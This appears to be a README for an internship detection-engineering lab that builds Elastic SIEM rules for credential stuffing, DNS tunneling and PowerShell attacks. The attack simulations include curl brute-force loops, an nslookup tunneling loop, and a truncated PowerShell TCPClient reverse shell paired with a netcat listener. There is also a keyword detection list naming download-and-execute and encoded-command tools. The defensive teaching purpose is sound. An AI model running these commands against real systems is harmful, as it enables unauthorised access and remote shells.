# Elastic-Detection-Engineering Lab

**Internship Project | SOC Analyst | March 2026**

Hands-on SIEM detection engineering lab using Elastic Stack to detect credential stuffing, DNS tunneling, and PowerShell-based attacks with real log analysis and alert validation.

---

## 🔥 Highlights

- Built a full Elastic SIEM lab from scratch (Kibana, Fleet, Packetbeat, Elasticsearch)
- Designed 5 detection rules across 3 rule types — EQL Sequence, Threshold, and KQL Query
- Detected credential stuffing, DNS tunneling, and PowerShell exploitation
- Simulated all attacks using Kali Linux against a live Windows 11 target
- All 5 alerts confirmed firing in the Elastic Security dashboard
- Created a SOC analyst runbook covering triage, investigation queries, and containment

---

## 🛠️ Skills Used

`Elastic Stack` `Kibana` `Fleet` `Elastic Agent` `Packetbeat` `EQL` `Ingest Pipelines` `ECS Field Mapping` `Detection Engineering` `SIEM Configuration` `Log Parsing` `Windows Event Logs` `PowerShell Script Block Logging` `Kali Linux` `MITRE ATT&CK` `Threat Simulation` `Alert Validation`

---

## 📸 Screenshots

---

### 🔥 Alerts Dashboard — All Rules Firing
> Elastic Security Alerts page showing all detection rules triggered — rule names, severity (High), timestamps, and risk scores visible in a single view.

![Alerts Dashboard](Screenshots/alerts-dashboard.png)

---

### 1️⃣ Credential Stuffing — Threshold Rule

**A. Failed Login Logs in Kibana Discover**
> Discover filtered by `event.outcome: failure` — parsed ECS fields (`source.ip`, `user.name`, `host.name`) confirming the auth log pipeline is working correctly.

![Auth Failures Discover](Screenshots/auth-failures-discover.png)

**B. Raw auth.log — Volume of Failures**
> auth.log showing rapid consecutive FAILURE entries from `172.30.80.1` — the raw input driving the detection pipeline.

![Auth Failures](Screenshots/auth-failures.png)

**C. Threshold Alert Triggered**
> `Credential Stuffing — Failed Logins from Single IP` alert — High severity, risk score 70, MITRE ATT&CK `TA0006 / T1110` mapped, source IP attributed.

![Credential Threshold Alert](Screenshots/credential-threshold-alert.png)

---

### 2️⃣ Credential Stuffing — EQL Sequence Rule

**A. Failure → Success Sequence in auth.log**
> auth.log showing 5 consecutive FAILURE entries immediately followed by a SUCCESS from the same IP — the exact `failure → success` pattern the EQL rule detects.

![Auth Success Sequence](Screenshots/auth-success-sequence.png)

**B. EQL Sequence Rule Configuration**
> Rule definition showing `sequence by source.ip, user.name with maxspan=5m` — `failure` followed by `success` — targeting `logs-xampp-auth*` index.

![EQL Rule Config](Screenshots/rules-config-eql.png)

**C. EQL Sequence Alert Triggered**
> `Credential Stuffing — Failure Followed by Successful Login` — High severity, risk score 80, username `admin` on host `pavillion15` attributed. Confirms account compromise detection.

![Credential EQL Alert](Screenshots/credential-eql-alert.png)

---

### 3️⃣ DNS Tunneling — Threshold Rule

**A. Sequential Subdomain Query Pattern**
> Windows CMD executing the `nslookup` loop — `data1.testlab.com`, `data2`, `data3`, `data4` queries in rapid succession. This high-frequency sequential subdomain pattern is characteristic of DNS tunneling.

![DNS Pattern](Screenshots/dns-pattern.png)

**B. DNS Events in Kibana Discover**
> Kibana Discover on `logs-network*` index — Packetbeat-captured DNS events with `dns.question.name`, `source.ip`, `destination.ip`, and `dns.response_code` fields populated.

![DNS Discover](Screenshots/dns-discover.png)

**C. DNS Tunneling Rule Configuration**
> Threshold rule — `≥50 DNS queries from single source.ip within 5 minutes` — targeting `logs-network*`. Behavioural detection, not domain-based.

![DNS Rule Config](Screenshots/rules-config-dns.png)

**D. DNS Tunneling Alert Triggered**
> `DNS Tunneling Detection` alert — High severity, risk score 73, source `192.168.1.2` attributed.

![DNS Alert](Screenshots/dns-alert.png)

---

### 4️⃣ PowerShell Exploitation — Keyword Rule

**A. Script Block Logging Events in Discover**
> Kibana Discover showing PowerShell Script Block Logging (Event ID 4104) events — `Execute a Remote Command` action, `host: pavillion15`, `user: Noel Biju John`.

![PowerShell Discover](Screenshots/powershell-discover.png)

**B. TCPClient Script Block Captured (CRITICAL)**
> Script block popup in Discover showing the exact `$client = New-Object System.Net.Sockets.TCPClient('172.30.89.150', 1234)` command captured at execution time — the evidence the rule fired on.

![PowerShell Script Block](Screenshots/powershell-scriptblock.png)

**C. PowerShell Rule Configuration**
> KQL query rule targeting `powershell.file.script_block_text` for keywords: `TCPClient`, `DownloadString`, `IEX`, `Invoke-WebRequest`, `FromBase64String`, `EncodedCommand`, `ExecutionPolicy`, `Net.WebClient`.

![PowerShell Rule Config](Screenshots/powershell-rule-config.png)

**D. PowerShell Exploitation Alert Triggered**
> `PowerShell Exploitation Detection` — High severity, risk score 70, process event attributed to user `Noel Biju John` on host `pavillion15`.

![PowerShell Alert](Screenshots/powershell-alert.png)

---

### 5️⃣ PowerShell Network Correlation — EQL Rule

**A. Correlation Evidence: Script Execution + Network Activity**
> Side-by-side: Kali Linux `nc -lvnp 1234` listener and Windows PowerShell executing `TCPClient('172.30.89.150', 1234)` — showing the attacker-side and victim-side simultaneously. The EQL rule correlates script block execution → outbound network connection within 30 seconds.

![PowerShell Correlation](Screenshots/powershell-correlation.png)

> ⚠️ **Note:** The `powershell_network_correlation.eql.ndjson` rule requires the Endpoint Security integration for `network` events from PowerShell. The Kibana Discover view above (screenshot 4B) shows both script block and network events from the same host in the same timeframe — confirming the correlation logic is sound even without a dedicated Endpoint agent alert.


---

## Lab Environment

| Component | Role |
|---|---|
| **Elastic Stack (Kibana + Elasticsearch)** | SIEM platform — log collection, parsing, detection rules, alerting |
| **Elastic Agent + Fleet** | Log ingestion and agent management |
| **Packetbeat** | Network-level packet capture for DNS traffic |
| **Windows 11 (XAMPP)** | Target host — hosted vulnerable PHP login app, generated auth logs |
| **Kali Linux** | Attacker machine — simulated credential stuffing, DNS tunneling, reverse shell |

---

## Detection Scenarios

### 1 — Credential Stuffing Detection

**Technique:** Attacker submits large volumes of username/password pairs (sourced from breached databases) against a login endpoint until one succeeds.

**Setup:**
- Hosted a vulnerable PHP login app on Windows via XAMPP
- Authentication attempts (pass/fail) logged to a flat `auth.log` file
- Custom Elastic ingest pipeline (`auth-log-parser`) built to parse log lines into ECS fields: `source.ip`, `user.name`, `event.outcome`
- Dissect pattern used: `%{auth.timestamp} | IP: %{source.ip} | USER: %{user.name} | STATUS: %{event.outcome}`

**Attack Simulation (Kali):**
```bash
# 20 failed attempts
for i in {1..20}; do
  curl -s -X POST http://172.30.80.1/lab/login.php \
    -d "username=admin&password=wrongpass" > /dev/null
done

# 1 successful login
curl -s -X POST http://172.30.80.1/lab/login.php \
  -d "username=admin&password=pass123" > /dev/null
```

**Detection Rules:**
| Rule | Type | Logic |
|---|---|---|
| Credential Stuffing — Failed Logins from Single IP | Threshold | ≥20 `event.outcome: failure` from same `source.ip` within 5 min |
| Credential Stuffing — Failure Followed by Successful Login | EQL Sequence | `failure` → `success` from same `source.ip` + `user.name` within 5 min |

**EQL Rule:**
```
sequence by source.ip, user.name with maxspan=5m
  [ any where event.outcome == "failure" ]
  [ any where event.outcome == "success" ]
```

**MITRE ATT&CK:** `TA0006 Credential Access` → `T1110 Brute Force`

**Alerts Generated:**
- Threshold rule → High severity, risk score 70 (triggered at 21:14:11)
- EQL correlation rule → High severity, risk score 80 (triggered at 21:40:38)

**Troubleshooting Note:** EQL rule initially failed to fire — traced to case sensitivity mismatch. Ingest pipeline normalised `event.outcome` to lowercase; original query used uppercase `"FAILURE"` / `"SUCCESS"`. Fixed by updating query values to lowercase.

---

### 2 — DNS Tunneling Detection

**Technique:** Attacker encodes data within DNS queries to communicate covertly with external systems. DNS traffic is typically allowed through firewalls without deep inspection, making it a common exfiltration and C2 channel.

**Setup:**
- Added Network Packet Capture integration in Fleet (Packetbeat)
- DNS monitoring enabled on port 53
- DNS events captured into `logs-network*` index with fields: `source.ip`, `dns.question.name`, `dns.response_code`

**Attack Simulation (Windows CMD):**
```cmd
for /L %i in (1,1,120) do nslookup data%i.testlab.com
```
Generated 120 sequential DNS queries for non-existent subdomains (`data1.testlab.com`, `data2.testlab.com`, ...) — all returning `NXDOMAIN`. High-frequency sequential subdomain queries are characteristic of DNS tunneling; successful resolution is not required.

**Detection Rule:**
| Field | Value |
|---|---|
| Rule Type | Threshold |
| Index | `logs-network*` |
| Query | `event.category:"network" AND dns.question.name:*` |
| Group By | `source.ip` |
| Threshold | ≥50 DNS queries within 5-minute window |
| Severity | High, risk score 73 |

**Alert Generated:** High severity alert at 21:51:09 from `192.168.1.2` — confirmed Packetbeat capture and threshold rule evaluation working correctly.

**Troubleshooting Note:** No DNS logs appeared initially — Packetbeat integration had not been enabled in Fleet. Enabling the Network Packet Capture integration and updating the agent policy resolved it.

---

### 3 — PowerShell Exploitation Detection

**Technique:** Attacker abuses PowerShell (a legitimate Windows administration tool) to establish reverse shells, download payloads, or execute encoded commands during post-exploitation.

**Setup:**
- Windows Event Logs collected via the Windows integration in Fleet
- PowerShell Script Block Logging (Event ID 4104) enabled — records full content of executed PowerShell commands
- Key fields available: `process.name`, `event.code`, `powershell.file.script_block_text`, `host.name`

**Attack Simulation (Windows PowerShell):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('172.30.89.150', 1234)
$stream = $client.GetStream()
# reverse shell payload
```

**Detection Rule:**
| Field | Value |
|---|---|
| Rule Type | Query |
| Index | `logs-windows*` |
| Query | Keywords: `Invoke-Expression`, `IEX`, `DownloadString`, `TCPClient`, `EncodedCommand`, `bypass`, `-nop` |
| Severity | High, risk score 70 |

**Alert Generated:** High severity alert at 22:17:57 on host `pavillion15` (user: Noel Biju John). Script block content captured the exact `TCPClient` command, confirming the detection logic identified the reverse shell attempt.

---

## Key Takeaways

- **Detection is not one-size-fits-all** — each attack required a different rule type (threshold, EQL sequence, keyword query) based on how it manifests in logs.
- **Data pipeline understanding is essential** — both troubleshooting issues (EQL case sensitivity, Packetbeat not enabled) required reasoning through the full ingestion-to-alert chain.
- **Behavioural detection > signature detection** — DNS tunneling rule detected based on query volume patterns, not known malicious domains. Effective even against new infrastructure.
- **Script Block Logging is high-value telemetry** — captures exact command content at execution time, enabling post-hoc forensic reconstruction and real-time detection.

---

## Repository Structure

```
elastic-detection-engineering-lab/
│
├── README.md                                      ← This file
├── architecture.md                                ← Lab topology, data flows, index patterns
├── soc_runbook.md                                 ← Analyst triage & response procedures
├── project_report.md                              ← Full project report (objectives, results, analysis)
├── LICENSE
├── .gitignore
│
├── rules/                                         ← Elastic-compatible detection rules (.ndjson)
│   ├── credential_stuffing_threshold.ndjson
│   ├── credential_stuffing_sequence.eql.ndjson
│   ├── dns_tunneling_volume_threshold.ndjson
│   ├── powershell_suspicious_args.ndjson
│   └── powershell_network_correlation.eql.ndjson
│
├── sample-logs/                                   ← Representative log events (ECS format)
│   ├── web-auth-logs-sample.json
│   ├── dns-logs-sample.json
│   └── powershell-logs-sample.json
│
└── ELK_Internship_Report.docx                    ← Full report with screenshots & alert evidence
```

> **Importing detection rules:** In Kibana → Security → Rules → Import rules → select any `.ndjson` file from `rules/`.

---

## Report

Full internship report with screenshots and alert evidence: [`ELK_Internship_Report.docx`](./ELK_Internship_Report.docx)
